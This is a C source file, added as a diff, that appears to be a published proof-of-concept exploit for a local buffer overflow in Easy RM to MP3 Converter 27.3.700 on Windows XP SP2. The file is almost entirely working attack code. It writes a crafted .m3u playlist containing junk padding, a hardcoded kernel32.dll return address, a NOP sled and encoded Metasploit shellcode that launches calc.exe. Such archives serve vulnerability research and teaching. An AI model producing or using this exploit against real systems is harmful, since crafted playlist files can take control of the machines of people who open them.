@@ -1,0 +1,87 @@
+// Exploit Title: Easy RM to MP3 27.3.700 local Buffer OverFlow Exploit on xp sp2
+// Date: 24/12/2009
+// Author: bibi-info
+// Software Link: http://www.rm-to-mp3.net/EasyRMtoMP3Converter.exe
+// Version: 27.3.700
+// Tested on: Windows Xp sp2
+// greetz : His0k4 & All friends & muslims HaCkers(dz) (18/11/2009 )
+
+
+
+#include<stdio.h>
+#include<string.h>
+#include<stdlib.h>
+
+
+
+/* win32_exec -  EXITFUNC=process CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com */
+unsigned char scode[] =
+                         "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
+                         "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
+                         "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
+                         "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
+                         "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
+                         "\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x34\x4e\x33\x4b\x58\x4e\x47"
+                         "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x48"
+                         "\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x58"
+                         "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c"
+                         "\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
+                         "\x46\x4f\x4b\x53\x46\x55\x46\x42\x46\x50\x45\x47\x45\x4e\x4b\x58"
+                         "\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x46\x4b\x38\x4e\x30\x4b\x54"
+                         "\x4b\x38\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
+                         "\x41\x30\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x30\x43\x4c\x41\x33"
+                         "\x42\x4c\x46\x36\x4b\x48\x42\x34\x42\x43\x45\x38\x42\x4c\x4a\x37"
+                         "\x4e\x50\x4b\x58\x42\x44\x4e\x50\x4b\x38\x42\x57\x4e\x41\x4d\x4a"
+                         "\x4b\x58\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x38\x42\x4b"
+                         "\x42\x50\x42\x50\x42\x30\x4b\x58\x4a\x46\x4e\x43\x4f\x45\x41\x33"
+                         "\x48\x4f\x42\x56\x48\x45\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x37"
+                         "\x42\x35\x4a\x46\x50\x57\x4a\x4d\x44\x4e\x43\x47\x4a\x46\x4a\x39"
+                         "\x50\x4f\x4c\x48\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x36"
+                         "\x4e\x36\x43\x46\x42\x50\x5a";
+
+
+
+
+
+int main ( int argc , char * argv[])
+
+{
+
+    FILE* fexp= NULL;
+    char* EIP = "\x0C\xAD\x81\x7C"; //0X7CAD810C kernel32.dll
+    int i;
+
+
+    system("cls");
+    printf("\t. .. ...Easy RM to MP3 Converter m3u File Buffer Overflow... .. .\r\n");
+    printf("\t          ------> execute calc.exe <-------\n");
+
+
+    if( (fexp=fopen("test.m3u","wb")) ==NULL )
+    {
+         perror("cannot open exploit  file!!!");
+         exit(0);
+    }
+
+                for (i=0; i<26069; i++)
+                {
+                    fwrite("\x41", 1, 1, fexp);  //Junk
+                }
+
+                fwrite(EIP, 4, 1, fexp);
+
+                for (i=0; i<50; i++)
+                {
+                    fwrite("\x90", 1, 1, fexp);// Nop's
+                }
+
+                fwrite(scode, sizeof(scode), 1, fexp);
+
+                fclose(fexp);
+                printf("[+] test.m3u Created\r\n");
+                printf("[+] Exploited By b!b!-!nfo\r\n");
+
+
+    return 0;
+
+}
